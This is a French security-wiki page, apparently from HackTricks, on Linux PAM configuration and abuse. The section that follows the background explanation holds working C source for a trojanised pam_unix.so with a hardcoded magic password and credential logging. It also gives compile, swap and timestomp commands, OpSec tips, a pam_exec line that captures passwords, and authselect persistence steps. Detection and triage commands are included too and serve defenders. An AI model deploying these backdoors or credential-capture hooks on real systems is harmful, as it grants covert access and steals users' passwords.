# PAM - Modules d’authentification enfichables

{{#include ../../banners/hacktricks-training.md}}

### Informations de base

**PAM (Pluggable Authentication Modules)** est un mécanisme de sécurité qui **vérifie l’identité des utilisateurs qui tentent d’accéder aux services informatiques** et contrôle leur accès selon divers critères. C’est comme un gardien numérique : il veille à ce que seuls les utilisateurs autorisés puissent utiliser certains services, tout en pouvant limiter leur utilisation afin d’éviter la surcharge du système.

#### Fichiers de configuration

- **Solaris** prend en charge l’ancien fichier central `/etc/pam.conf`, mais les recommandations actuelles privilégient les fichiers de service dans `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Les systèmes Linux** privilégient une approche par répertoire, en stockant les configurations propres à chaque service dans `/etc/pam.d`. Par exemple, le fichier de configuration du service de connexion se trouve dans `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Un exemple de configuration PAM pour le service de connexion pourrait ressembler à ceci :

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **Domaines de gestion PAM**

Ces domaines, ou groupes de gestion, comprennent **auth**, **account**, **password** et **session**, chacun étant responsable d’aspects différents du processus d’authentification et de gestion des sessions :<sup>[[1]](#references)</sup>

- **Auth** : Valide l’identité de l’utilisateur, souvent en demandant un mot de passe.
- **Account** : Gère la vérification des comptes et contrôle des conditions telles que l’appartenance à un groupe ou les restrictions horaires.
- **Password** : Gère les changements de mot de passe, notamment les vérifications de complexité et la prévention des attaques par dictionnaire.
- **Session** : Gère les actions au début ou à la fin d’une session de service, comme le montage de répertoires ou la définition de limites de ressources.

#### **Contrôles des modules PAM**

Les contrôles déterminent la réponse du module en cas de réussite ou d’échec et influencent le processus global d’authentification. Ils comprennent :<sup>[[1]](#references)</sup>

- **Required** : L’échec d’un module requis entraîne un échec final, mais seulement après la vérification de tous les modules suivants.
- **Requisite** : Interrompt immédiatement le processus en cas d’échec.
- **Sufficient** : Si aucun module `required` précédent n’a échoué, la réussite est renvoyée immédiatement et les modules restants du même groupe de gestion sont ignorés.
- **Optional** : N’entraîne un échec que s’il s’agit du seul module de la pile.

#### Sémantique offensive à connaître

Lors de l’analyse ou de la modification de PAM, **l’emplacement d’une règle insérée** détermine quelle pile la prend en compte :<sup>[[1]](#references)[[13]](#references)</sup>

- `include` et `substack` récupèrent des règles dans d’autres fichiers. Ainsi, modifier `sshd` peut n’affecter que SSH, tandis que modifier `system-auth`, `common-auth` ou une autre pile partagée peut affecter plusieurs services à la fois.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM prend également en charge les contrôles entre crochets tels que `[success=1 default=ignore]`. Ils peuvent être détournés pour **ignorer un ou plusieurs modules** après la réussite d’une vérification personnalisée, au lieu de remplacer visiblement `pam_unix.so`.<sup>[[1]](#references)</sup>
- Le `module-path` peut être **absolu** (`/usr/lib/security/pam_custom.so`) ou **relatif** au répertoire par défaut des modules PAM. Sur les systèmes Linux modernes, les répertoires réels sont souvent `/lib/security`, `/lib64/security`, `/usr/lib/security` ou des chemins multiarch comme `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

À retenir pour les opérateurs : cartographiez toujours le **graphe complet des services** avant toute modification. Par exemple, `sshd -> password-auth -> system-auth` sur certaines distributions ou `sshd -> system-remote-login -> system-login -> system-auth` sur d’autres signifie qu’un même implant d’une seule ligne peut avoir une portée bien plus large que prévu.<sup>[[1]](#references)[[13]](#references)</sup>

Un module `auth` personnalisé peut ajouter à `sudo` un défi interactif après le mot de passe du compte. Avant d’examiner manuellement le défi, inspectez la pile effective de `/etc/pam.d/sudo`, les règles incluses, les arguments des modules et les permissions de tout fichier de données local référencé. Une liste de mots de défi lisible ne contourne pas à elle seule la vérification du mot de passe et ne crée pas de règle sudoers. Une transition privilégiée nécessite toujours une authentification correcte du compte, la réussite de chaque étape PAM requise et une règle sudo autorisant l’accès à root ; une énumération sans interaction ne doit pas déclencher le défi.

Pour l’ancienne faille de propriété d’Ubuntu [`pam_motd` (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832), vérifiez la build réelle de `libpam-modules` et si un service de connexion appelle le module de session concerné. Ubuntu a corrigé la faille dans **1.1.0-2ubuntu1.1** pour la version 9.10 et dans **1.1.1-2ubuntu5** pour la version 10.04 LTS ; les autres versions et les rétroportages des fournisseurs nécessitent une évaluation propre à leurs paquets. Le scénario signalé exigeait que l’appelant remplace son `.cache` personnel par un lien symbolique, puis déclenche une connexion PAM, ce qui amenait l’ancien module à modifier la propriété d’une cible protégée. Une entrée `.cache`, une ligne `pam_motd.so` ou une ancienne version du noyau ne suffisent pas à établir une exposition ; vérifiez le contrôle du répertoire personnel, la version effective du module, la possibilité d’atteindre le service de connexion, le traitement des liens symboliques et les permissions de la cible, sans remplacer de fichiers ni déclencher de connexion pendant l’énumération passive. Consultez [l’avis de sécurité d’Ubuntu](https://ubuntu.com/security/notices/USN-959-1).

#### Exemple de scénario

Dans une configuration utilisant plusieurs modules `auth`, le processus suit un ordre strict. Si le module `pam_securetty` détecte que le terminal de connexion n’est pas autorisé, les connexions root sont bloquées, mais tous les modules sont quand même traités en raison de son statut « required ». Le module `pam_env` définit des variables d’environnement, ce qui peut améliorer l’expérience utilisateur. Les modules `pam_ldap` et `pam_unix` collaborent pour authentifier l’utilisateur ; `pam_unix` tente d’utiliser un mot de passe fourni précédemment, ce qui améliore l’efficacité et la flexibilité des méthodes d’authentification.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## `pam_permit` dans une pile de service

`pam_permit.so` renvoie une réussite pour les vérifications PAM. Si un utilisateur disposant de privilèges inférieurs peut modifier la politique PAM effective d’un service, l’insertion de ce module avec un indicateur de contrôle qui interrompt prématurément la pile d’authentification peut supprimer la vérification du mot de passe pour ce service. Pour `sudo`, inspectez `/etc/pam.d/sudo` et tout fichier `common-auth` ou `system-auth` inclus avant de déterminer quels services sont concernés. Un contournement de l’authentification PAM **ne** crée **pas** de nouvelle règle sudoers ; l’utilisateur doit toujours être autorisé à exécuter la commande demandée. Vérifiez l’ordre des règles et tout échec antérieur d’un module `required` au lieu de supposer qu’une seule ligne `sufficient pam_permit.so` réussit toujours.

## Rétroporte de PAM – détournement de `pam_unix.so`

Une technique classique de persistance dans les environnements Linux sensibles consiste à **remplacer la bibliothèque PAM légitime par un module de remplacement trojanisé**. Sur un hôte dont la pile PAM charge `pam_unix.so`, l’authentification SSH ou console peut appeler son point d’entrée `pam_sm_authenticate()` ; un remplacement malveillant peut capturer les identifiants ou implémenter un contournement par mot de passe *magique*.<sup>[[2]](#references)[[11]](#references)</sup>

### Aide-mémoire de compilation
L’exemple ci-dessous utilise le point d’entrée de service `pam_sm_authenticate()` de Linux-PAM et `pam_get_authtok()` pour accéder au jeton d’authentification.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Exemple de cheval de Troie `pam_unix.so`</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

Compilez et remplacez discrètement (le modèle replacement/timestomp est documenté par Unit 42). Ajustez à la fois le chemin de sauvegarde codé en dur dans le wrapper et les commandes ci-dessous au répertoire réel des modules PAM de la cible :<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### Conseils OpSec
1. **Écrasement atomique** – écrivez une bibliothèque complète dans un fichier temporaire, puis renommez-le pour la mettre en place et éviter de laisser un module d’authentification partiellement écrit.
2. Le chemin `/usr/bin/.dbus.log` a été observé dans l’analyse d’AuthDoor de Unit 42 ; c’est donc aussi un indicateur utile pour la recherche de menaces.<sup>[[2]](#references)</sup>
3. Conservez les points d’entrée attendus par la pile PAM (par exemple, `pam_sm_authenticate` et `pam_sm_setcred`) afin que les autres opérations de gestion continuent de fonctionner.<sup>[[11]](#references)[[18]](#references)</sup>

### Détection
Pour vérifier l’intégrité des paquets, RPM vérifie les métadonnées des fichiers installés, `debsums -s` signale les erreurs de somme de contrôle et `dpkg -S`, dans le bloc de triage, interroge les propriétaires des paquets ; la syntaxe de surveillance d’audit enregistre les écritures et les modifications d’attributs d’un chemin.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Comparez le MD5/SHA256 de `pam_unix.so` à celui du paquet de la distribution.
* Utilisez `rpm -V pam` ou `debsums -s libpam-modules` pour repérer les bibliothèques remplacées sans calcul manuel des empreintes.
* Vérifiez la présence de permissions d’écriture pour tous les utilisateurs ou de propriétaires inhabituels dans `/lib/security/`.
* Règle `auditd` : `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Recherchez les modules inattendus dans les configurations PAM : `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

Cette recherche `pam_` ne détecte pas les modules personnalisés dont le nom de base est différent de celui des fichiers `.so`. Examinez les lignes `auth`, `account`, `password` et `session` **actives** dans `/etc/pam.d` (et dans `/etc/pam.conf`, le cas échéant), y compris leur indicateur de contrôle et toute pile incluse. La présence d’un module inconnu en tant que `auth sufficient` avant la vérification normale du mot de passe justifie de vérifier le propriétaire du paquet et d’examiner le binaire ; [la syntaxe de contrôle de PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html) peut permettre à une réussite de mettre fin prématurément à cette partie de la pile. Un nom de module, un horodatage inhabituel ou l’option `nodelay` ne prouvent pas à eux seuls qu’il y a contournement. Si le comportement suggère une fuite temporelle, examinez d’abord l’implémentation et l’accessibilité du service ; lors d’une énumération courante, évitez de soumettre à répétition des tentatives d’authentification.

### Commandes rapides de triage (après compromission ou pour la recherche de menaces)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Abuser de `pam_exec` pour assurer la persistance
Au lieu de remplacer `pam_unix.so`, une approche moins intrusive consiste à ajouter une ligne `pam_exec` dans `/etc/pam.d/sshd`, afin qu’une invocation qui atteint cette ligne PAM exécute un helper tout en laissant la pile normale intacte.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` reçoit les métadonnées PAM dans des variables d’environnement telles que `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` et `PAM_TYPE`. Avec `expose_authtok`, l’utilitaire peut lire jusqu’à `PAM_MAX_RESP_SIZE` octets du mot de passe depuis `stdin` pendant les phases `auth` ou `password`. Pour que l’utilitaire s’exécute avec l’UID effectif plutôt que l’UID réel, ajoutez `seteuid`.<sup>[[4]](#references)</sup>

Voici quelques conseils pratiques concernant les types de module et le filtre `type=` documentés pour `pam_exec` :<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` convient mieux aux **actions post-connexion**, comme la réouverture de sockets ou le lancement d’un daemon détaché.
- `auth optional pam_exec.so quiet expose_authtok ...` est généralement utilisé pour la **capture d’identifiants**, car il s’exécute avant l’ouverture de la session.
- `type=session` ou `type=auth` permet de limiter l’exécution à une phase PAM spécifique et d’éviter les doubles exécutions intempestives.

Pour l’examen des privilèges, un chemin absolu vers un utilitaire `pam_exec.so` modifiable par l’utilisateur actuel est un élément à vérifier, même si le fichier est marqué append-only (`a`) : [cet attribut autorise l’ajout de contenu](https://man7.org/linux/man-pages/man1/chattr.1.html), ce qui peut suffire à modifier le comportement ultérieur d’un script shell. Vérifiez d’abord que le service PAM et l’événement atteignent effectivement cette ligne, que l’utilitaire et son chemin parent sont fiables, et que la commande s’exécute sous une identité plus privilégiée ; [`seteuid` modifie l’UID PAM utilisé](https://man7.org/linux/man-pages/man8/pam_exec.8.html). Un fichier modifiable ou le résultat de `lsattr` ne prouve pas à lui seul qu’une exécution privilégiée a lieu.

### Résister aux outils de distribution : `authselect`

Sur les systèmes de la famille RHEL et Fedora qui utilisent `authselect`, les modifications directes des fichiers générés, comme `/etc/pam.d/system-auth` ou `/etc/pam.d/password-auth`, peuvent être **écrasées par `authselect`**. Pour assurer la persistance, les opérateurs modifient souvent le profil personnalisé actif sous `/etc/authselect/custom/<profile>/`, puis le sélectionnent de nouveau.<sup>[[5]](#references)[[19]](#references)</sup>

Procédure type lorsque vous avez les droits root :<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

Cela compte aussi bien pour l’offensive que pour le triage : si `/etc/pam.d/system-auth` contient la bannière `Generated by authselect` et `Do not modify this file manually`, le véritable point de persistance peut se trouver sous `/etc/authselect/custom/` plutôt que dans `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Tradecraft récemment observé dans la nature

Des rapports récents de 2025 sur la backdoor Linux **Plague** ont montré que la même idée de base était poussée plus loin : un composant PAM malveillant doté d’un **mot de passe de contournement statique**, ainsi que le nettoyage des variables d’environnement liées à SSH et de l’historique du shell (`HISTFILE=/dev/null`) pour réduire les traces de la session après la connexion.<sup>[[3]](#references)</sup> Ce modèle de recherche est utile, car la logique de la backdoor peut se trouver dans PAM, tandis que les artefacts de furtivité n’apparaissent **qu’après** la réussite de l’authentification.


## References

- [1] [pam.conf(5) / pam.d(5) - Manuel Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Le manuel de l’opérateur clandestin : infiltration des réseaux mondiaux de télécommunications - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague : une backdoor basée sur PAM pour Linux récemment découverte](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Manuel Linux-PAM](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Configurer l’authentification des utilisateurs avec authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Pages de manuel Debian](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Page de manuel Linux](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Pages de manuel Debian](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Gestion de l’authentification dans Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Manuel Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Manuel Linux-PAM](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Guide de l’authentification au niveau système - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Liste des fichiers du paquet Ubuntu : libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Manuel Linux-PAM](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Manuel Linux-PAM](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Pages de manuel Debian](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Manuel Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Modifications/Imposer l’utilisation d’Authselect - Wiki du projet Fedora](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
